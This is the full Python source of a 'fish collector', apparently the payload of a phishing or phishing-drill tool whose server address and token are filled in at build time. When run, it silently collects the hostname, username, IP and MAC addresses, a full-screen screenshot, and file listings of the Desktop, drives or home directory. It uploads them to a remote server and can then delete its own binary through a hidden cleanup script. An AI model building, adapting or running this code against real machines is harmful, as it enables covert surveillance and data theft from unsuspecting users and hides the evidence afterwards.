import socket
import os
import json
import uuid
import sys
import subprocess
from datetime import datetime

# ---- CONFIG (replaced at build time) ----
SERVER_URL = "{{SERVER_URL}}"
TOKEN = "{{TOKEN}}"
SELF_DESTRUCT = "{{SELF_DESTRUCT}}"       # "true" or "false"
POPUP_ENABLED = "{{POPUP_ENABLED}}"       # "true" or "false"
POPUP_MESSAGE = "{{POPUP_MESSAGE}}"       # popup text after execution
# ------------------------------------------


FOOTER_KEY = b'fishfish@aes'


def _xor(data, key):
    """XOR encrypt/decrypt data with a repeating key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))


def _load_footer_config():
    """Read XOR-encrypted JSON config from a footer appended to this binary.
    Used when the binary is produced by copy+append on Linux,
    rather than PyInstaller embed on Windows."""
    try:
        exe_path = os.path.abspath(sys.argv[0])
        with open(exe_path, 'rb') as f:
            f.seek(-1024, 2)  # last 1KB
            tail = f.read()
        marker = b'---FISHCFG---'
        start = tail.find(marker)
        if start >= 0:
            end = tail.find(marker, start + len(marker))
            if end >= 0:
                encrypted = tail[start + len(marker):end]
                decrypted = _xor(encrypted, FOOTER_KEY)
                cfg = json.loads(decrypted.decode('utf-8'))
                return cfg
    except Exception:
        pass
    return None


_footer_cfg = _load_footer_config()
if _footer_cfg:
    SERVER_URL = _footer_cfg.get('server_url', SERVER_URL)
    TOKEN = _footer_cfg.get('token', TOKEN)
    SELF_DESTRUCT = 'true' if _footer_cfg.get('self_destruct') else 'false'
    POPUP_ENABLED = 'true' if _footer_cfg.get('popup_enabled', True) else 'false'
    POPUP_MESSAGE = _footer_cfg.get('popup_message', POPUP_MESSAGE)

IS_WINDOWS = sys.platform == 'win32'

if IS_WINDOWS:
    try:
        import ctypes
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass


# ---- Network Info ----

def _get_network_info_windows():
    """Get per-adapter IP + MAC pairs using Windows API."""
    import ctypes
    result = []

    MAX_ADAPTER_NAME = 256
    MAX_ADAPTER_DESC = 128

    class IP_ADDR_STRING(ctypes.Structure):
        pass

    IP_ADDR_STRING._fields_ = [
        ("next", ctypes.c_void_p),
        ("ip_address", ctypes.c_char * 16),
        ("ip_mask", ctypes.c_char * 16),
        ("context", ctypes.c_uint32),
    ]

    class IP_ADAPTER_INFO(ctypes.Structure):
        pass

    IP_ADAPTER_INFO._fields_ = [
        ("next", ctypes.c_void_p),
        ("combo_index", ctypes.c_uint32),
        ("adapter_name", ctypes.c_char * (MAX_ADAPTER_NAME + 4)),
        ("description", ctypes.c_char * (MAX_ADAPTER_DESC + 4)),
        ("address_length", ctypes.c_uint32),
        ("address", ctypes.c_uint8 * 8),
        ("index", ctypes.c_uint32),
        ("type", ctypes.c_uint32),
        ("dhcp_enabled", ctypes.c_uint32),
        ("current_ip_address", ctypes.c_void_p),
        ("ip_address_list", IP_ADDR_STRING),
        ("gateway_list", IP_ADDR_STRING),
        ("dhcp_server", IP_ADDR_STRING),
        ("have_wins", ctypes.c_uint32),
        ("primary_wins_server", IP_ADDR_STRING),
        ("secondary_wins_server", IP_ADDR_STRING),
        ("lease_obtained", ctypes.c_uint32),
        ("lease_expires", ctypes.c_uint32),
    ]

    iphlpapi = ctypes.windll.iphlpapi

    buf_size = ctypes.c_uint32(0)
    ret = iphlpapi.GetAdaptersInfo(None, ctypes.byref(buf_size))
    if ret != 111:  # ERROR_BUFFER_OVERFLOW
        return result

    buf = ctypes.create_string_buffer(buf_size.value)
    ret = iphlpapi.GetAdaptersInfo(ctypes.cast(buf, ctypes.c_void_p), ctypes.byref(buf_size))
    if ret != 0:
        return result

    ptr = ctypes.cast(buf, ctypes.c_void_p).value
    while ptr:
        adapter = ctypes.cast(ptr, ctypes.POINTER(IP_ADAPTER_INFO)).contents
        mac = ':'.join(f'{b:02X}' for b in adapter.address[:adapter.address_length])
        ip_str = adapter.ip_address_list.ip_address.decode('ascii', errors='ignore').strip()
        if ip_str and ip_str != '0.0.0.0':
            result.append({'ip': ip_str, 'mac': mac})
        ptr = adapter.next

    return result


def _get_network_info_linux():
    """Get per-interface IP + MAC pairs on Linux using /sys/class/net."""
    import fcntl
    import struct
    result = []
    net_dir = '/sys/class/net'
    if not os.path.exists(net_dir):
        return result

    for iface in sorted(os.listdir(net_dir)):
        if iface == 'lo':
            continue
        # MAC address
        mac_path = os.path.join(net_dir, iface, 'address')
        mac = ''
        try:
            with open(mac_path, 'r') as f:
                mac = f.read().strip().upper()
        except Exception:
            pass
        # IP address via ioctl
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ip = socket.inet_ntoa(
                fcntl.ioctl(sock.fileno(), 0x8915,  # SIOCGIFADDR
                            struct.pack('256s', iface[:15].encode()))[20:24]
            )
            sock.close()
        except Exception:
            ip = ''
        if ip and ip != '127.0.0.1':
            result.append({'ip': ip, 'mac': mac})

    return result


def get_network_info():
    if IS_WINDOWS:
        return _get_network_info_windows()
    return _get_network_info_linux()


# ---- Screenshot ----

def _screenshot_windows():
    """Take screenshot using Windows GDI + GDI+ (no PIL dependency)."""
    import ctypes
    from ctypes import wintypes
    import io as io_mod
    import uuid as _uuid
    import os as _os
    import struct

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    x = user32.GetSystemMetrics(76)
    y = user32.GetSystemMetrics(77)
    w = user32.GetSystemMetrics(78)
    h = user32.GetSystemMetrics(79)
    if w <= 0 or h <= 0:
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        x = y = 0

    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
    old = gdi32.SelectObject(hdc_mem, hbmp)
    gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, x, y, 0x00CC0020 | 0x40000000)
    gdi32.SelectObject(hdc_mem, old)

    result = None

    try:
        gdiplus = ctypes.windll.gdiplus

        class _SI(ctypes.Structure):
            _pack_ = 1
            _fields_ = [
                ('Version', wintypes.DWORD),
                ('DebugCb', ctypes.c_void_p),
                ('NoBg', wintypes.BOOL),
                ('NoExt', wintypes.BOOL),
            ]

        si = _SI(1, None, 1, 0)

        # ULONG_PTR is pointer-sized (4 bytes on 32-bit, 8 on 64-bit)
        is64 = struct.calcsize('P') == 8
        if is64:
            token = ctypes.c_ulonglong()
        else:
            token = ctypes.c_ulong()
        if gdiplus.GdiplusStartup(ctypes.byref(token), ctypes.byref(si), None) != 0:
            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)
            return None

        try:
            gp_bmp = ctypes.c_void_p()
            status = gdiplus.GdipCreateBitmapFromHBITMAP(hbmp, 0, ctypes.byref(gp_bmp))
            if status != 0:
                raise RuntimeError(f'GdipCreateBitmapFromHBITMAP failed: {status}')

            class GUID(ctypes.Structure):
                _fields_ = [
                    ('Data1', wintypes.DWORD),
                    ('Data2', wintypes.WORD),
                    ('Data3', wintypes.WORD),
                    ('Data4', ctypes.c_byte * 8),
                ]

            jpeg_clsid = _uuid.UUID('{557CF401-1A04-11D3-9A73-0000F81EF32E}')
            clsid = GUID.from_buffer_copy(jpeg_clsid.bytes_le)

            tmp = _os.path.join(_os.environ.get('TEMP', '.'), f'_s{_uuid.uuid4().hex[:8]}.jpg')
            status = gdiplus.GdipSaveImageToFile(
                gp_bmp, ctypes.c_wchar_p(tmp), ctypes.byref(clsid), None)
            if status != 0:
                raise RuntimeError(f'GdipSaveImageToFile failed: {status}')

            if _os.path.exists(tmp):
                with open(tmp, 'rb') as f:
                    result = io_mod.BytesIO(f.read())
                _os.unlink(tmp)

            gdiplus.GdipDisposeImage(gp_bmp)
        finally:
            gdiplus.GdiplusShutdown(token)
    except Exception:
        result = None

    gdi32.DeleteObject(hbmp)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)

    return result


def take_screenshot():
    """Take a screenshot. Platform-specific methods with fallbacks."""
    import io as io_mod

    if IS_WINDOWS:
        try:
            return _screenshot_windows()
        except Exception:
            return None

    # Linux: try import (ImageMagick), then scrot, then xdg-desktop-portal
    methods = [
        ['import', '-window', 'root', '-strip', 'jpg:-'],
        ['scrot', '-', '-t', '0'],
    ]
    for method in methods:
        try:
            proc = subprocess.run(method, capture_output=True, timeout=15)
            if proc.returncode == 0 and proc.stdout:
                return io_mod.BytesIO(proc.stdout)
        except Exception:
            continue

    return None


# ---- Directory Scanning ----

def scan_directory(path, max_depth=1, max_files=500):
    """Scan a directory and return a tree structure."""
    result = {'path': path, 'exists': False, 'tree': [], 'error': ''}
    if not os.path.exists(path):
        result['error'] = 'path not found'
        return result

    if IS_WINDOWS:
        skip_dirs = {'$Recycle.Bin', 'System Volume Information', 'Windows',
                     'Program Files', 'Program Files (x86)', 'ProgramData',
                     'Config.Msi', 'Recovery', 'MSOCache', 'PerfLogs'}
    else:
        skip_dirs = {'proc', 'sys', 'dev', 'run', 'snap', 'lost+found',
                     '/proc', '/sys', '/dev', '/run'}

    result['exists'] = True
    file_count = 0
    try:
        for root, dirs, files in os.walk(path):
            depth = root.replace(path, '').count(os.sep)
            if depth >= max_depth:
                dirs.clear()
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in skip_dirs
                       and not d.startswith('$')]
            rel_root = os.path.relpath(root, path)

            if depth == 0:
                for d in sorted(dirs):
                    result['tree'].append({'type': 'dir', 'name': d, 'children': []})
                for f in sorted(files):
                    full_path = os.path.join(root, f)
                    try:
                        size = os.path.getsize(full_path)
                    except Exception:
                        size = 0
                    result['tree'].append({
                        'type': 'file', 'name': f, 'size': size
                    })
                    file_count += 1
            else:
                parent_name = rel_root.split(os.sep, 1)[0] if os.sep in rel_root else rel_root
                parent = next((d for d in result['tree'] if d['type'] == 'dir' and d['name'] == parent_name), None)
                if parent:
                    for f in sorted(files):
                        full_path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(full_path)
                        except Exception:
                            size = 0
                        parent['children'].append({
                            'type': 'file', 'name': f, 'size': size
                        })
                        file_count += 1
                        if file_count >= max_files:
                            break

            if file_count >= max_files:
                break
    except Exception as e:
        result['error'] = str(e)

    return result


def scan_target_directories():
    """Scan user's home directory on Linux, or Desktop/C:/D: on Windows."""
    results = {}

    if IS_WINDOWS:
        user_profile = os.environ.get('USERPROFILE', '')
        if user_profile:
            desktop_path = os.path.join(user_profile, 'Desktop')
            results['Desktop'] = scan_directory(desktop_path)
        if os.path.exists('C:/'):
            results['C_drive'] = scan_directory('C:/')
        if os.path.exists('D:/'):
            results['D_drive'] = scan_directory('D:/')
    else:
        home = os.path.expanduser('~')
        results['Home'] = scan_directory(home)
        if os.path.exists('/tmp'):
            results['tmp'] = scan_directory('/tmp')

    return results


# ---- Data Sending ----

def send_data(data, screenshot_bytes):
    """Send collected data and screenshot to server."""
    import urllib.request
    import urllib.error

    url = f"{SERVER_URL}/api/collect"
    boundary = '----FishBoundary' + uuid.uuid4().hex[:16]

    body = []
    for key, value in data.items():
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="{key}"'.encode())
        body.append(b'')
        body.append(str(value).encode())

    if screenshot_bytes:
        body.append(f'--{boundary}'.encode())
        body.append(
            f'Content-Disposition: form-data; name="screenshot"; filename="screenshot.jpg"'.encode()
        )
        body.append(b'Content-Type: image/jpeg')
        body.append(b'')
        body.append(screenshot_bytes.getvalue() if hasattr(screenshot_bytes, 'getvalue') else screenshot_bytes)

    body.append(f'--{boundary}--'.encode())

    payload = b'\r\n'.join(body)

    req = urllib.request.Request(url, data=payload)
    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    try:
        resp = urllib.request.urlopen(req, timeout=30)
        return resp.read().decode()
    except urllib.error.URLError as e:
        print(f"Send error: {e}")
        return None
    except Exception as e:
        print(f"Send error: {e}")
        return None


# ---- Self-Destruct ----

def _self_destruct_windows():
    """Windows: batch script deletes EXE after process exits."""
    import ctypes
    exe_path = os.path.abspath(sys.argv[0])
    if not exe_path.lower().endswith('.exe'):
        return
    dir_name = os.path.dirname(exe_path)
    random_name = uuid.uuid4().hex[:12]
    fake_path = os.path.join(dir_name, random_name)
    with open(fake_path, 'wb') as f:
        f.write(b'')

    bat_path = os.path.join(os.environ.get('TEMP', '.'), f'_c{uuid.uuid4().hex[:6]}.bat')
    with open(bat_path, 'w') as f:
        f.write(f'@echo off\r\n'
                f':loop\r\n'
                f'del /f "{exe_path}" >nul 2>&1\r\n'
                f'if exist "{exe_path}" (\r\n'
                f'    timeout /t 1 /nobreak >nul\r\n'
                f'    goto loop\r\n'
                f')\r\n'
                f'del "%~f0" >nul 2>&1\r\n')

    subprocess.Popen(
        ['cmd.exe', '/c', bat_path],
        creationflags=0x08000000,
        close_fds=True,
    )
    print(f"[*] Self-destruct: {exe_path} -> {fake_path}")


def _self_destruct_linux():
    """Linux: shell script deletes binary after process exits, leaves zero-byte file."""
    import stat
    exe_path = os.path.abspath(sys.argv[0])
    dir_name = os.path.dirname(exe_path)
    random_name = uuid.uuid4().hex[:12]
    fake_path = os.path.join(dir_name, random_name)
    with open(fake_path, 'wb') as f:
        f.write(b'')

    # Shell script that waits for parent PID to exit, then deletes the binary
    cleanup = os.path.join('/tmp', f'_c{uuid.uuid4().hex[:6]}.sh')
    pid = os.getpid()
    with open(cleanup, 'w') as f:
        f.write(f'#!/bin/sh\n'
                f'while kill -0 {pid} 2>/dev/null; do sleep 1; done\n'
                f'rm -f "{exe_path}"\n'
                f'rm -f "$0"\n')
    os.chmod(cleanup, stat.S_IRWXU)
    subprocess.Popen([cleanup], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     close_fds=True, start_new_session=True)
    print(f"[*] Self-destruct: {exe_path} -> {fake_path}")


def self_destruct():
    try:
        if IS_WINDOWS:
            _self_destruct_windows()
        else:
            _self_destruct_linux()
    except Exception as e:
        print(f"[!] Self-destruct failed: {e}")


# ---- Popup ----

def show_popup():
    """Show a message box / notification with configured text."""
    if IS_WINDOWS:
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, '提示', 0x30)
        except Exception:
            pass
    else:
        # Try zenity (GUI), then notify-send (desktop notification)
        for method in (
            ['zenity', '--warning', '--text', POPUP_MESSAGE],
            ['notify-send', POPUP_MESSAGE],
        ):
            try:
                subprocess.run(method, timeout=5,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                break
            except Exception:
                continue


# ---- Main ----

def main():
    print("[*] Starting fish collector...")
    print(f"[*] Token: {TOKEN}")
    print(f"[*] Server: {SERVER_URL}")

    hostname = socket.gethostname()
    if IS_WINDOWS:
        username = os.environ.get('USERNAME', 'unknown')
    else:
        username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))

    net_info = get_network_info()
    ip_list = '\n'.join(f"{ni['ip']}  ({ni['mac']})" for ni in net_info)

    print(f"[*] Hostname: {hostname}")
    print(f"[*] Username: {username}")
    print(f"[*] Network:\n{ip_list}")

    print("[*] Taking screenshot...")
    screenshot_bytes = take_screenshot()
    if screenshot_bytes:
        size = screenshot_bytes.getbuffer().nbytes if hasattr(screenshot_bytes, 'getbuffer') else len(screenshot_bytes.getvalue())
        print(f"[*] Screenshot captured ({size} bytes)")
    else:
        print("[!] Screenshot failed")

    print(f"[*] Scanning directories...")
    dir_info = scan_target_directories()

    data = {
        'token': TOKEN,
        'hostname': hostname,
        'username': username,
        'ip_address': ip_list,
        'mac_address': json.dumps(net_info, ensure_ascii=False),
        'directory_info': json.dumps(dir_info, ensure_ascii=False),
        'timestamp': datetime.now().isoformat(),
    }

    print("[*] Sending data to server...")
    result = send_data(data, screenshot_bytes)
    if result:
        print(f"[*] Server response: {result}")
    else:
        print("[!] Failed to send data")

    if POPUP_ENABLED.lower() == 'true':
        show_popup()

    if SELF_DESTRUCT.lower() == 'true':
        self_destruct()

    print("[*] Done.")


if __name__ == '__main__':
    main()
